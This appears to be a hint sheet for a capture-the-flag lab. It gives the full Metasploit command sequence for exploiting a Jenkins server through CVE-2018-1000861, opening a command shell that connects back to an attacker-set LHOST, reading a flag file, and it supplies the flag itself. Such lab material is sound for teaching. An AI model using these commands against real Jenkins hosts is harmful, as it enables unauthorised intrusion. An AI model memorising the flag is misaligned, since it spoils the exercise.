HINT -- phase 3 (msfconsole)
══════════════════════════════════════════════════════════════════

THE FULL METASPLOIT WALK
────────────────────────
Open metasploit:

    msfconsole

Then type these inside the msf6 prompt, one at a time:

    search CVE-2018-1000861
    use 0
    set RHOSTS 10.4.12.1
    set LHOST 10.4.12.99
    check
    exploit

WHAT HAPPENS WHEN EXPLOIT FIRES
───────────────────────────────
You'll see "Command shell session 1 opened" and the prompt goes
blank. You're on the Jenkins box now -- typing commands AS the
jenkins user. Read the blueprint:

    cat /var/m0use/blueprint.txt

The flag is on the line that starts with "Flag:". Copy the value
from inside m0use{...}.

GETTING BACK OUT
────────────────
To leave the shell session:   exit
To leave msfconsole:          exit

HOW TO SUBMIT
─────────────
Type the flag value at the m0usenet prompt (no m0use{...} wrap, no
keyword):

    jenkins_was_a_mistake
